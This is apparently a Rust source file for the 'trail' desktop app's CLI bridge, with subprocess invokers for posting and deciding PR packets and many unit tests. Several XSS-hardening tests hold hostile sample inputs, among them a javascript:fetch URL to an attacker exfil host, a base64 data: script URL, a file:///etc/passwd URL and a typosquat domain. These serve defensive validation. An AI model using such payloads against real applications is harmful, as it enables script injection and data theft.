/// 300s covers the gh auth handshake + several PR API roundtrips at
/// pessimistic latency. The post path makes ~4 gh API calls (auth,
/// repo view, pr view, pr edit + body read); decide makes ~6.
pub const PACKET_OP_DEFAULT_TIMEOUT: Duration = Duration::from_secs(300);

/// Invoke `trail packet post --packet <path> [--pr <N>] --yes [--posted-by <id>]`.
/// Returns the parsed success outcome on exit 0; structured `PacketOpError`
/// otherwise. The caller (IPC handler) translates the kind into the
/// matching `IpcError` variant so the M4 modal can surface the right
/// edge-flow Banner.
///
/// The bridge always passes `--yes` because the M4 modal performs
/// destination confirmation in-app (B6 P1 hardening).
pub fn invoke_packet_post(
    bin: &str,
    packet_path: &str,
    pr_number: Option<u32>,
    posted_by: &str,
    timeout: Duration,
) -> Result<PacketPostOutcome, PacketOpError> {
    let pr_str: String;
    let mut args: Vec<&str> = vec!["packet", "post", "--packet", packet_path, "--yes"];
    if let Some(n) = pr_number {
        pr_str = n.to_string();
        args.push("--pr");
        args.push(&pr_str);
    }
    if !posted_by.is_empty() {
        args.push("--posted-by");
        args.push(posted_by);
    }
    let (_stdout, stderr, status) = match spawn_with_timeout(bin, &args, timeout) {
        Ok(v) => v,
        Err(e) => {
            warn!(target: "trail::cli_bridge::post", error = %e, "spawn_with_timeout failed");
            return Err(bridge_to_packet_err(e, String::new()));
        }
    };
    if !status.success() {
        let code = status.code().unwrap_or(-1);
        return Err(PacketOpError {
            kind: classify_packet_op_failure(code, &stderr),
            stderr,
            exit_code: Some(code),
        });
    }
    // Parse the post-success line. If parsing fails (Phase 3b CLI changed
    // its output format), still return Ok with whatever we found — we
    // know the post succeeded because exit was 0.
    if let Some(outcome) = parse_post_outcome(&stderr) {
        return Ok(outcome);
    }
    warn!(target: "trail::cli_bridge::post", "post exited 0 but could not parse stderr; stderr={}", stderr);
    Ok(PacketPostOutcome {
        pr_url: String::new(),
        body_hash_prefix: String::new(),
        destination: String::new(),
    })
}

/// Invoke `trail packet decide --packet <p> [--pr <N>] --claim <c>
/// --decision <d> [--reason <r>] [--by <b>]`.
pub fn invoke_packet_decide(
    bin: &str,
    packet_path: &str,
    pr_number: Option<u32>,
    claim: &str,
    decision: &str,
    reason: Option<&str>,
    by: &str,
    timeout: Duration,
) -> Result<PacketDecideOutcome, PacketOpError> {
    let pr_str: String;
    let mut args: Vec<&str> = vec![
        "packet",
        "decide",
        "--packet",
        packet_path,
        "--claim",
        claim,
        "--decision",
        decision,
    ];
    if let Some(n) = pr_number {
        pr_str = n.to_string();
        args.push("--pr");
        args.push(&pr_str);
    }
    if let Some(r) = reason {
        args.push("--reason");
        args.push(r);
    }
    if !by.is_empty() {
        args.push("--by");
        args.push(by);
    }
    let (_stdout, stderr, status) = match spawn_with_timeout(bin, &args, timeout) {
        Ok(v) => v,
        Err(e) => {
            warn!(target: "trail::cli_bridge::decide", error = %e, "spawn_with_timeout failed");
            return Err(bridge_to_packet_err(e, String::new()));
        }
    };
    if !status.success() {
        let code = status.code().unwrap_or(-1);
        return Err(PacketOpError {
            kind: classify_packet_op_failure(code, &stderr),
            stderr,
            exit_code: Some(code),
        });
    }
    if let Some(outcome) = parse_decide_outcome(&stderr) {
        return Ok(outcome);
    }
    warn!(target: "trail::cli_bridge::decide", "decide exited 0 but could not parse stderr; stderr={}", stderr);
    Ok(PacketDecideOutcome {
        pr_url: String::new(),
        claim_id: claim.to_string(),
        decision: decision.to_string(),
    })
}

/// Validate that `bin` resolves to a runnable command. Used by the UI's
/// settings panel to gate the "save" of a custom `capture_cli_path`. We
/// run a quick `--version` probe; non-success → reject the path.
///
/// gh#17 AC#3: spawns with `PATH_AUGMENTATIONS` prepended to PATH so
/// Verify cannot diverge from Detect on macOS GUI-launched processes. A
/// path that resolves via Detect must also Verify (and vice versa); the
/// previous default-PATH spawn made Verify fail on every macOS install
/// where node lives at `/opt/homebrew/bin/node`.
pub fn validate_capture_cli_path(bin_or_path: &str) -> Result<CaptureVersion, BridgeError> {
    // Lightweight path-existence check when looks like an absolute path,
    // before paying the spawn cost.
    if bin_or_path.starts_with('/') || bin_or_path.starts_with('.') {
        if !Path::new(bin_or_path).exists() {
            return Err(BridgeError::Spawn(format!(
                "no such file: {bin_or_path}"
            )));
        }
    }
    let result = probe_capture_version_with_augmented_path(bin_or_path);
    if let Err(ref e) = result {
        warn!(target: "trail::cli_bridge", path = %bin_or_path, error = %e, "capture CLI probe failed");
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    // Cycle-1.5 F10 (P3): the cargo tests below use POSIX utilities
    // (echo / true / false / /nonexistent) to exercise the generic
    // subprocess primitives. End-to-end coverage of "UI → Tauri →
    // cli_bridge → trail --version" requires a Playwright
    // harness that points `capture_cli_path` at a node script
    // emitting "0.1.0-dev"; that's deferred to the Playwright spec
    // suite. The vitest M6SettingsModal-cli-bridge.test.tsx
    // integration test (Sprint 4 cycle-1.5 F3 fix) covers the React
    // pathway end-to-end with a mocked Tauri bridge — which jointly
    // close AC-11 modulo the real-binary subprocess test.

    /// Write a minimal POSIX shell-script fixture under tmp/ that we
    /// can pass to `probe_capture_version` (via its first argv) for a
    /// portable subprocess test. GNU coreutils on Linux interprets
    /// `--version` flags on `echo` and `true` (printing version banners),
    /// which broke the prior fixture-by-builtin approach on CI runners.
    /// A handcrafted shell script avoids that platform variance.
    fn write_test_script(body: &str) -> std::path::PathBuf {
        use std::fs::{self, File};
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;
        // Per-call tempdir + post-write read-open-sync. Together these
        // address two layers of the ETXTBSY ("Text file busy", errno 26)
        // race observed on Linux CI when parallel cargo test threads
        // create + exec scripts:
        //
        //   1. Per-call tempdir eliminates the shared-parent-dir vector
        //      (sibling threads no longer share an open-file-table slot
        //      on the parent inode).
        //   2. Post-write read-open-sync forces the kernel to commit the
        //      file's writeable-FD state — without this, Command::spawn()
        //      can fork() while the kernel still considers the file
        //      "recently writeable" and exec() returns ETXTBSY.
        //
        // Earlier single-layer fixes (atomic SEQ + sync_all + scope drop)
        // were insufficient on their own. Observed in CI runs 26027652183
        // and 26028048015 (gh#2 Phase 1 land).
        let dir = tempfile::Builder::new()
            .prefix("trail-cli-bridge-test-")
            .tempdir()
            .expect("tempdir");
        let path = dir.path().join("script.sh");
        {
            let mut f = File::create(&path).expect("create script");
            writeln!(f, "#!/bin/sh").unwrap();
            f.write_all(body.as_bytes()).unwrap();
            f.write_all(b"\n").unwrap();
            f.sync_all().expect("sync_all");
        }
        let mut perms = fs::metadata(&path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&path, perms).unwrap();
        // Read-open + sync_all + close after chmod. The act of opening
        // the file read-only, fsyncing, and closing forces the kernel to
        // fully release any pending writeable-FD bookkeeping. Without
        // this re-open dance, ETXTBSY fires intermittently at exec.
        {
            let f = File::open(&path).expect("re-open ro for sync");
            f.sync_all().expect("sync after reopen");
        }
        // Leak the tempdir handle so the script outlives this function;
        // probe_capture_version below must exec the path. OS reaps /tmp
        // on next boot — cost is bounded (<10 cli_bridge tests).
        std::mem::forget(dir);
        path
    }

    /// ETXTBSY retry wrapper for tests that exec a freshly-written script.
    /// Even with per-call tempdir + re-open-sync, the Linux kernel
    /// occasionally still returns "Text file busy" at fork+exec when
    /// parallel test threads are concurrently active. The retry is a
    /// last-mile defense: up to 5 attempts with linear backoff.
    fn probe_with_etxtbsy_retry(bin: &str) -> Result<CaptureVersion, BridgeError> {
        for attempt in 0u64..5 {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(50 * attempt));
            }
            match probe_capture_version(bin) {
                Err(BridgeError::Spawn(msg))
                    if msg.contains("Text file busy") && attempt < 4 =>
                {
                    continue;
                }
                other => return other,
            }
        }
        unreachable!("retry loop exits via the `other` arm")
    }

    /// Not a fake — invokes a REAL subprocess (a handcrafted shell script
    /// that emits a known version line). We deliberately do NOT mock
    /// `Command`; the bridge must work on a real subprocess (gh#11
    /// criterion 13). The handcrafted script avoids Linux/BSD divergence
    /// on builtins like `echo` / `true` (Sprint 5 fix: GNU coreutils on
    /// CI runners interprets `--version` and prints a version banner,
    /// breaking the prior `probe_capture_version("echo")` fixture).
    #[test]
    fn probe_returns_first_line_of_stdout() {
        let script = write_test_script("printf '0.1.0-dev\\n'");
        let result = probe_with_etxtbsy_retry(&script.to_string_lossy());
        assert!(
            result.is_ok(),
            "real subprocess invocation must succeed: {result:?}"
        );
        let version = result.unwrap();
        assert_eq!(version.version, "0.1.0-dev");
    }

    #[test]
    fn probe_returns_spawn_error_on_missing_binary() {
        let result = probe_capture_version("/nonexistent/binary/that/cannot/exist");
        match result {
            Err(BridgeError::Spawn(_)) => {}
            other => panic!("expected Spawn error, got {other:?}"),
        }
    }

    #[test]
    fn probe_rejects_empty_stdout() {
        // Script exits 0 with no stdout; bridge must return InvalidStdout.
        // (Sprint 5 fix: GNU `true --version` on Linux emits a banner;
        // a handcrafted no-output script is platform-portable.)
        let script = write_test_script("exit 0");
        let result = probe_with_etxtbsy_retry(&script.to_string_lossy());
        match result {
            Err(BridgeError::InvalidStdout(_)) => {}
            other => panic!("expected InvalidStdout error, got {other:?}"),
        }
    }

    #[test]
    fn probe_rejects_non_zero_exit() {
        // Script exits 1 with no output; bridge must return NonZeroExit.
        let script = write_test_script("exit 1");
        let result = probe_with_etxtbsy_retry(&script.to_string_lossy());
        match result {
            Err(BridgeError::NonZeroExit { code, .. }) => {
                assert_eq!(code, 1);
            }
            other => panic!("expected NonZeroExit, got {other:?}"),
        }
    }

    #[test]
    fn validate_rejects_absent_absolute_path() {
        let result = validate_capture_cli_path("/nonexistent/binary/that/cannot/exist");
        match result {
            Err(BridgeError::Spawn(_)) => {}
            other => panic!("expected Spawn error for absent path, got {other:?}"),
        }
    }

    // ----- gh#17 — augmented-PATH probe (AC#3) ---------------------------

    /// Test fixture: a shell script that emits its own `$PATH` env on
    /// stdout. We use this to inspect what PATH the child process inherits
    /// from the augmented-path probe — the cleanest assertion that PATH
    /// augmentation is wired through to the subprocess.
    fn write_path_echo_script() -> std::path::PathBuf {
        write_test_script("printf '%s\\n' \"$PATH\"")
    }

    #[test]
    fn build_augmented_path_prepends_homebrew_and_npm_bins() {
        // The PATH augmentation is the load-bearing fix for the macOS
        // GUI-PATH bug. If this drifts, the env-shebang lookup for
        // `#!/usr/bin/env node` regresses on every Tauri GUI launch.
        let path = build_augmented_path();
        assert!(
            path.contains("/opt/homebrew/bin"),
            "augmented PATH must include /opt/homebrew/bin (got: {path})"
        );
        assert!(
            path.contains("/usr/local/bin"),
            "augmented PATH must include /usr/local/bin (got: {path})"
        );
    }

    #[test]
    fn build_augmented_path_expands_home_prefix() {
        // gh#17 spec: $HOME-prefixed entries are expanded at call time
        // (not stored literally). The resolved value MUST include the
        // user's actual home directory rather than the literal
        // "$HOME/..." token. We can't set HOME for this thread safely;
        // instead assert the actual home dir appears when HOME is set
        // in the test process.
        if let Ok(home) = std::env::var("HOME") {
            let path = build_augmented_path();
            let expected = format!("{home}/.npm-global/bin");
            assert!(
                path.contains(&expected),
                "augmented PATH must include {expected} (got: {path})"
            );
        }
    }

    #[test]
    fn probe_with_augmented_path_passes_augmentations_to_subprocess() {
        // End-to-end proof that the augmented-PATH variant actually
        // sets the spawned child's PATH env. We probe a script that
        // echoes its $PATH; the returned `version` is the child's PATH
        // verbatim. If augmentation fails to propagate, this regresses
        // visibly.
        let script = write_path_echo_script();
        let result = probe_with_etxtbsy_retry_augmented(&script.to_string_lossy());
        assert!(
            result.is_ok(),
            "augmented-path probe must succeed: {result:?}"
        );
        let inherited_path = result.unwrap().version;
        assert!(
            inherited_path.contains("/opt/homebrew/bin"),
            "child PATH must contain /opt/homebrew/bin (got: {inherited_path})"
        );
        assert!(
            inherited_path.contains("/usr/local/bin"),
            "child PATH must contain /usr/local/bin (got: {inherited_path})"
        );
    }

    #[test]
    fn validate_capture_cli_path_uses_augmented_path() {
        // gh#17 AC#3: Verify and Detect must use the same PATH-augmented
        // spawn. validate_capture_cli_path is the back-end of Verify;
        // probing a $PATH-echo script through it must produce the same
        // augmented PATH that the direct augmented probe sees. A
        // regression to the default-PATH probe_capture_version breaks
        // every macOS first-launch flow.
        let script = write_path_echo_script();
        let result = validate_capture_cli_path(&script.to_string_lossy());
        // ETXTBSY retry is open-coded here because validate has its own
        // path-existence prelude; we just re-run on Text-file-busy.
        let result = retry_on_etxtbsy(result, || {
            validate_capture_cli_path(&script.to_string_lossy())
        });
        assert!(
            result.is_ok(),
            "validate must succeed against the path-echo script: {result:?}"
        );
        let inherited_path = result.unwrap().version;
        assert!(
            inherited_path.contains("/opt/homebrew/bin"),
            "validate's subprocess must inherit augmented PATH (got: {inherited_path})"
        );
    }

    /// ETXTBSY retry for the augmented-path probe — same shape as the
    /// existing `probe_with_etxtbsy_retry`, parallel implementation
    /// because the function under test is different.
    fn probe_with_etxtbsy_retry_augmented(
        bin: &str,
    ) -> Result<CaptureVersion, BridgeError> {
        for attempt in 0u64..5 {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(50 * attempt));
            }
            match probe_capture_version_with_augmented_path(bin) {
                Err(BridgeError::Spawn(msg))
                    if msg.contains("Text file busy") && attempt < 4 =>
                {
                    continue;
                }
                other => return other,
            }
        }
        unreachable!("retry loop exits via the `other` arm")
    }

    /// Generic ETXTBSY retry — takes an initial result and a retry
    /// closure so call sites with a path-existence prelude can compose.
    fn retry_on_etxtbsy<F>(
        initial: Result<CaptureVersion, BridgeError>,
        mut retry: F,
    ) -> Result<CaptureVersion, BridgeError>
    where
        F: FnMut() -> Result<CaptureVersion, BridgeError>,
    {
        let mut result = initial;
        for attempt in 1u64..5 {
            match &result {
                Err(BridgeError::Spawn(msg)) if msg.contains("Text file busy") => {
                    std::thread::sleep(Duration::from_millis(50 * attempt));
                    result = retry();
                }
                _ => return result,
            }
        }
        result
    }

    // ----- gh#17 — detect_capture_cli orchestrator (AC#1, AC#2) -----------

    #[test]
    fn classify_detect_failure_none_returns_binary_not_installed() {
        let f = classify_detect_failure(None);
        assert_eq!(f.kind, DetectFailureKind::BinaryNotInstalled);
        assert!(
            f.suggested_fix.contains("npm install"),
            "install hint missing: {}",
            f.suggested_fix
        );
    }

    #[test]
    fn classify_detect_failure_127_with_env_node_stderr_returns_node_missing() {
        // The signature failure mode that motivated #17.
        let err = BridgeError::NonZeroExit {
            code: 127,
            stderr: "env: node: No such file or directory\n".to_string(),
        };
        let f = classify_detect_failure(Some(err));
        assert_eq!(f.kind, DetectFailureKind::NodeMissing);
        assert!(
            f.suggested_fix.contains("ln -s") || f.suggested_fix.contains("terminal"),
            "expected symlink or terminal hint: {}",
            f.suggested_fix
        );
    }

    #[test]
    fn classify_detect_failure_127_without_env_node_stderr_returns_probe_error() {
        // exit 127 but stderr does NOT mention env+node. Could be a
        // user-mistyped binary path. Don't misclassify as node-missing.
        let err = BridgeError::NonZeroExit {
            code: 127,
            stderr: "trail: command not found".to_string(),
        };
        let f = classify_detect_failure(Some(err));
        assert_eq!(f.kind, DetectFailureKind::ProbeError);
    }

    #[test]
    fn classify_detect_failure_timeout_returns_probe_timed_out() {
        let err = BridgeError::Timeout(Duration::from_secs(30));
        let f = classify_detect_failure(Some(err));
        assert_eq!(f.kind, DetectFailureKind::ProbeTimedOut);
    }

    #[test]
    fn classify_detect_failure_non_zero_exit_returns_probe_error() {
        let err = BridgeError::NonZeroExit {
            code: 1,
            stderr: "some error\nsecond line".to_string(),
        };
        let f = classify_detect_failure(Some(err));
        assert_eq!(f.kind, DetectFailureKind::ProbeError);
        // First stderr line surfaces in message; subsequent lines do not.
        assert!(f.message.contains("some error"));
        assert!(!f.message.contains("second line"));
    }

    #[test]
    fn classify_detect_failure_spawn_returns_binary_not_installed() {
        let err = BridgeError::Spawn("no such file".to_string());
        let f = classify_detect_failure(Some(err));
        assert_eq!(f.kind, DetectFailureKind::BinaryNotInstalled);
    }

    #[test]
    fn detect_failure_kind_serializes_as_kebab_case() {
        // The IPC payload uses these strings verbatim; the UI's failure
        // card switches on the kebab-case discriminant.
        assert_eq!(DetectFailureKind::BinaryNotInstalled.as_str(), "binary-not-installed");
        assert_eq!(DetectFailureKind::NodeMissing.as_str(), "node-missing");
        assert_eq!(DetectFailureKind::ProbeTimedOut.as_str(), "probe-timed-out");
        assert_eq!(DetectFailureKind::ProbeError.as_str(), "probe-error");
    }

    #[test]
    fn detect_source_serializes_as_kebab_case() {
        assert_eq!(DetectSource::LoginShell.as_str(), "login-shell");
        assert_eq!(DetectSource::Candidate.as_str(), "candidate");
        assert_eq!(DetectSource::MarkerFile.as_str(), "marker-file");
    }

    #[test]
    fn detect_config_default_includes_npm_install_paths() {
        let cfg = DetectConfig::default();
        // The four canonical npm install locations on macOS / Linux must
        // appear. The HOME-expanded entries depend on $HOME being set
        // (test runners always have HOME set).
        assert!(
            cfg.candidate_paths.iter().any(|p| p == "/opt/homebrew/bin/trail"),
            "candidate_paths missing /opt/homebrew/bin/trail: {:?}",
            cfg.candidate_paths
        );
        assert!(
            cfg.candidate_paths.iter().any(|p| p == "/usr/local/bin/trail"),
            "candidate_paths missing /usr/local/bin/trail: {:?}",
            cfg.candidate_paths
        );
        if let Ok(home) = std::env::var("HOME") {
            assert!(
                cfg.candidate_paths
                    .iter()
                    .any(|p| p == &format!("{home}/.npm-global/bin/trail")),
                "candidate_paths missing $HOME/.npm-global/bin/trail: {:?}",
                cfg.candidate_paths
            );
        }
    }

    #[test]
    fn detect_finds_trail_via_candidate_path() {
        // Place a working trail-like script at a candidate location and
        // assert detect_capture_cli_with_config finds it via strategy (b).
        let script = write_test_script("printf '0.1.0-detect-test\\n'");
        let cfg = DetectConfig {
            candidate_paths: vec![script.to_string_lossy().to_string()],
            skip_login_shell: true,
            marker_file: None,
        };
        let result = detect_with_etxtbsy_retry(&cfg);
        assert!(result.is_ok(), "must detect candidate: {result:?}");
        let success = result.unwrap();
        assert_eq!(success.source, DetectSource::Candidate);
        assert_eq!(success.version, "0.1.0-detect-test");
        assert_eq!(success.path, script.to_string_lossy().to_string());
    }

    #[test]
    fn detect_skips_missing_candidates_and_returns_failure() {
        // Two candidates; neither exists on disk → falls through to
        // failure classification with BinaryNotInstalled.
        let cfg = DetectConfig {
            candidate_paths: vec![
                "/nonexistent/path/one/trail".to_string(),
                "/nonexistent/path/two/trail".to_string(),
            ],
            skip_login_shell: true,
            marker_file: None,
        };
        let result = detect_capture_cli_with_config(&cfg);
        assert!(result.is_err());
        assert_eq!(
            result.unwrap_err().kind,
            DetectFailureKind::BinaryNotInstalled
        );
    }

    #[test]
    fn detect_falls_through_to_marker_file_when_no_candidates_match() {
        let trail_script = write_test_script("printf '0.1.0-from-marker\\n'");
        let trail_path = trail_script.to_string_lossy().to_string();
        // Write the marker file pointing at the script.
        let dir = tempfile::Builder::new()
            .prefix("trail-detect-marker-test-")
            .tempdir()
            .expect("tempdir");
        let marker_path = dir.path().join("last-run.json");
        std::fs::write(
            &marker_path,
            serde_json::to_vec(&serde_json::json!({ "cli_path": trail_path }))
                .unwrap(),
        )
        .unwrap();
        let cfg = DetectConfig {
            candidate_paths: vec!["/nonexistent/trail".to_string()],
            skip_login_shell: true,
            marker_file: Some(marker_path),
        };
        let result = detect_with_etxtbsy_retry(&cfg);
        assert!(result.is_ok(), "must detect via marker file: {result:?}");
        let success = result.unwrap();
        assert_eq!(success.source, DetectSource::MarkerFile);
        assert_eq!(success.version, "0.1.0-from-marker");
        // Leak the tempdir so the marker file survives until probe ran.
        std::mem::forget(dir);
    }

    #[test]
    fn detect_probe_order_candidates_beat_marker_file() {
        // When BOTH a candidate AND the marker file would succeed, the
        // candidate strategy must win (AC#2 ordering: candidates before
        // marker).
        let candidate_script = write_test_script("printf '0.1.0-from-candidate\\n'");
        let marker_script = write_test_script("printf '0.1.0-from-marker\\n'");
        let dir = tempfile::Builder::new()
            .prefix("trail-detect-order-test-")
            .tempdir()
            .expect("tempdir");
        let marker_path = dir.path().join("last-run.json");
        std::fs::write(
            &marker_path,
            serde_json::to_vec(&serde_json::json!({
                "cli_path": marker_script.to_string_lossy().to_string(),
            }))
            .unwrap(),
        )
        .unwrap();
        let cfg = DetectConfig {
            candidate_paths: vec![candidate_script.to_string_lossy().to_string()],
            skip_login_shell: true,
            marker_file: Some(marker_path),
        };
        let result = detect_with_etxtbsy_retry(&cfg);
        let success = result.expect("must detect");
        assert_eq!(success.source, DetectSource::Candidate);
        assert_eq!(success.version, "0.1.0-from-candidate");
        std::mem::forget(dir);
    }

    #[test]
    fn read_marker_cli_path_returns_none_when_file_absent() {
        let p = std::path::PathBuf::from("/tmp/trail-marker-does-not-exist-xyz123");
        assert!(read_marker_cli_path(&p).is_none());
    }

    #[test]
    fn read_marker_cli_path_returns_none_when_field_missing() {
        let dir = tempfile::Builder::new()
            .prefix("trail-marker-missing-field-")
            .tempdir()
            .unwrap();
        let p = dir.path().join("marker.json");
        std::fs::write(&p, b"{\"other_field\":\"value\"}").unwrap();
        assert!(read_marker_cli_path(&p).is_none());
    }

    #[test]
    fn read_marker_cli_path_returns_none_when_target_does_not_exist() {
        let dir = tempfile::Builder::new()
            .prefix("trail-marker-stale-")
            .tempdir()
            .unwrap();
        let p = dir.path().join("marker.json");
        std::fs::write(
            &p,
            b"{\"cli_path\":\"/totally/stale/path/that/cannot/exist\"}",
        )
        .unwrap();
        assert!(read_marker_cli_path(&p).is_none());
    }

    #[test]
    fn is_env_node_missing_matches_canonical_stderr() {
        assert!(is_env_node_missing("env: node: No such file or directory"));
        assert!(is_env_node_missing(
            "env: \u{2018}node\u{2019}: No such file or directory" // GNU env quotes
        ));
        assert!(!is_env_node_missing("trail: command not found"));
        assert!(!is_env_node_missing("env: bash: No such file"));
    }

    /// ETXTBSY retry for the detect_capture_cli orchestrator. The
    /// candidate probe spawns a script we just wrote — same race as
    /// `probe_with_etxtbsy_retry`. Retries the orchestrator up to 5x
    /// when the underlying spawn fails with "Text file busy".
    fn detect_with_etxtbsy_retry(
        cfg: &DetectConfig,
    ) -> Result<DetectSuccess, DetectFailure> {
        for attempt in 0u64..5 {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(50 * attempt));
            }
            let result = detect_capture_cli_with_config(cfg);
            match &result {
                Err(failure) if failure.message.contains("Text file busy") && attempt < 4 => {
                    continue;
                }
                _ => return result,
            }
        }
        unreachable!("retry loop exits via the `_` arm")
    }

    // ----- Sprint 5 (gh#12) — packet post + decide subprocess invokers ------

    #[test]
    fn classify_maps_each_phase3b_exit_code() {
        // Each Phase 3b exit code maps to exactly one PacketOpErrorKind.
        // Drift between this map and apps/capture/src/exit-codes.ts is a
        // SECURITY-relevant correctness issue: a misclassified auth-fail
        // would surface as "network error" and prompt the user to retry
        // when they should be running `gh auth login` instead.
        assert_eq!(classify_packet_op_failure(2, ""), PacketOpErrorKind::PacketNotFound);
        assert_eq!(classify_packet_op_failure(3, ""), PacketOpErrorKind::Auth);
        assert_eq!(classify_packet_op_failure(4, ""), PacketOpErrorKind::GhMissing);
        assert_eq!(classify_packet_op_failure(5, ""), PacketOpErrorKind::Validation);
        assert_eq!(classify_packet_op_failure(6, ""), PacketOpErrorKind::Write);
        assert_eq!(
            classify_packet_op_failure(7, ""),
            PacketOpErrorKind::NetworkOrRateLimit
        );
        assert_eq!(classify_packet_op_failure(8, ""), PacketOpErrorKind::InvalidArgs);
        assert_eq!(classify_packet_op_failure(9, ""), PacketOpErrorKind::PrNotFound);
    }

    #[test]
    fn classify_exit_1_with_packet_not_found_keyword_refines_to_packet_not_found() {
        // Phase 3b's "no such file" / "packet not found" stderr lines
        // come back with exit 1 (generic) in some code paths; the
        // keyword-sniffing branch refines the classification so the
        // M4 modal can show the right edge-flow Banner (E1 corrupt
        // packet vs E5 gh auth expired).
        let kind = classify_packet_op_failure(1, "error: packet not found: /tmp/missing.yml");
        assert_eq!(kind, PacketOpErrorKind::PacketNotFound);
        let kind2 = classify_packet_op_failure(1, "ENOENT: no such file");
        assert_eq!(kind2, PacketOpErrorKind::PacketNotFound);
    }

    #[test]
    fn classify_exit_1_unknown_falls_back_to_other() {
        let kind = classify_packet_op_failure(1, "something weird happened");
        assert_eq!(kind, PacketOpErrorKind::Other);
    }

    #[test]
    fn kind_str_round_trips_for_all_variants() {
        // The kind str is the IPC discriminant; if we add a variant
        // without a string mapping it would be UB-ish (silent default).
        let all = [
            PacketOpErrorKind::Auth,
            PacketOpErrorKind::GhMissing,
            PacketOpErrorKind::PrNotFound,
            PacketOpErrorKind::NetworkOrRateLimit,
            PacketOpErrorKind::PacketNotFound,
            PacketOpErrorKind::Validation,
            PacketOpErrorKind::Write,
            PacketOpErrorKind::InvalidArgs,
            PacketOpErrorKind::Spawn,
            PacketOpErrorKind::Timeout,
            PacketOpErrorKind::Other,
        ];
        for v in &all {
            let s = v.as_str();
            assert!(!s.is_empty());
            assert!(s.chars().all(|c| c.is_ascii_lowercase() || c == '-'));
        }
    }

    #[test]
    fn parse_post_outcome_extracts_url_and_body_hash() {
        // Mirrors Phase 3b post/index.ts's stderr emission verbatim.
        let stderr = "Posting to synaptiai/trail#432 (https://github.com/synaptiai/trail/pull/432)\nposted packet to https://github.com/synaptiai/trail/pull/432 (body_hash 0123456789abcdef\u{2026})\n";
        let outcome = parse_post_outcome(stderr).expect("must parse");
        assert_eq!(outcome.destination, "synaptiai/trail#432");
        assert_eq!(
            outcome.pr_url,
            "https://github.com/synaptiai/trail/pull/432"
        );
        assert_eq!(outcome.body_hash_prefix, "0123456789abcdef");
    }

    #[test]
    fn parse_post_outcome_returns_none_when_post_line_absent() {
        let stderr = "no post happened here\n";
        assert!(parse_post_outcome(stderr).is_none());
    }

    #[test]
    fn parse_decide_outcome_extracts_claim_decision_url() {
        let stderr = "decision recorded: CLAIM-001 block; comment + body posted to https://github.com/synaptiai/trail/pull/432\n";
        let outcome = parse_decide_outcome(stderr).expect("must parse");
        assert_eq!(outcome.claim_id, "CLAIM-001");
        assert_eq!(outcome.decision, "block");
        assert_eq!(
            outcome.pr_url,
            "https://github.com/synaptiai/trail/pull/432"
        );
    }

    #[test]
    fn parse_decide_outcome_handles_stable_id_claim() {
        // v0.1.1 B1: the URL must look like a real github.com PR; example.com
        // is no longer accepted (was incidental in pre-B1 fixture).
        let stderr = "decision recorded: 0123456789abcdef accept; comment + body posted to https://github.com/synaptiai/trail/pull/1\n";
        let outcome = parse_decide_outcome(stderr).expect("must parse");
        assert_eq!(outcome.claim_id, "0123456789abcdef");
        assert_eq!(outcome.decision, "accept");
    }

    #[test]
    fn parse_decide_outcome_returns_none_when_format_mismatch() {
        assert!(parse_decide_outcome("nothing here\n").is_none());
        assert!(parse_decide_outcome("decision recorded: only-one-token\n").is_none());
    }

    // v0.1.1 B1: XSS hardening — a compromised capture CLI emitting a
    // javascript:/data:/file:/wrong-domain URL must be rejected at the
    // Rust boundary so the renderer never sees it as a clickable href.
    #[test]
    fn parse_post_outcome_rejects_javascript_url() {
        let stderr = "posted packet to javascript:fetch('https://attacker/exfil') (body_hash deadbeef\u{2026})\n";
        assert!(
            parse_post_outcome(stderr).is_none(),
            "javascript: URL must be rejected"
        );
    }

    #[test]
    fn parse_post_outcome_rejects_data_url() {
        let stderr = "posted packet to data:text/html;base64,PHNjcmlwdD4= (body_hash 0123\u{2026})\n";
        assert!(parse_post_outcome(stderr).is_none(), "data: URL must be rejected");
    }

    #[test]
    fn parse_post_outcome_rejects_file_url() {
        let stderr = "posted packet to file:///etc/passwd\n";
        assert!(parse_post_outcome(stderr).is_none(), "file:// URL must be rejected");
    }

    #[test]
    fn parse_post_outcome_rejects_non_github_domain() {
        let stderr = "posted packet to https://gitlab.com/foo/bar/pull/1\n";
        assert!(parse_post_outcome(stderr).is_none(), "non-github.com URL must be rejected");
    }

    #[test]
    fn parse_post_outcome_rejects_github_subdomain_typosquat() {
        let stderr = "posted packet to https://github.com.attacker.io/foo/bar/pull/1\n";
        assert!(
            parse_post_outcome(stderr).is_none(),
            "github.com.attacker.io must be rejected (anchored regex)"
        );
    }

    #[test]
    fn parse_post_outcome_rejects_whitespace_smuggling() {
        let stderr = "posted packet to https://github.com/foo/bar/pull/1 onclick=alert(1)\n";
        // The post-line parser splits on " (body_hash " so this URL ends up as
        // the full trailing string. Anchored regex rejects the embedded space.
        assert!(
            parse_post_outcome(stderr).is_none(),
            "URL with whitespace smuggling must be rejected"
        );
    }

    #[test]
    fn parse_decide_outcome_rejects_javascript_url() {
        let stderr = "decision recorded: CLAIM-001 block; comment + body posted to javascript:alert(1)\n";
        assert!(
            parse_decide_outcome(stderr).is_none(),
            "javascript: URL in decide outcome must be rejected"
        );
    }

    #[test]
    fn is_github_pr_url_accepts_canonical_shapes() {
        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/1"));
        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/12345"));
        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/1/"));
        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/1?diff=split"));
        // Owners and repos may contain dots, hyphens, underscores.
        assert!(is_github_pr_url("https://github.com/some-org/my.repo_name/pull/9"));
    }

    #[test]
    fn is_github_pr_url_rejects_unsafe_shapes() {
        // Wrong scheme
        assert!(!is_github_pr_url("http://github.com/foo/bar/pull/1"));
        assert!(!is_github_pr_url("javascript:alert(1)"));
        assert!(!is_github_pr_url("data:text/html,<script>"));
        // Empty / oversize
        assert!(!is_github_pr_url(""));
        let oversize = format!("https://github.com/a/b/pull/{}", "1".repeat(600));
        assert!(!is_github_pr_url(&oversize));
        // Wrong path shape
        assert!(!is_github_pr_url("https://github.com/foo/bar/issues/1"));
        assert!(!is_github_pr_url("https://github.com/foo/bar/pull/"));
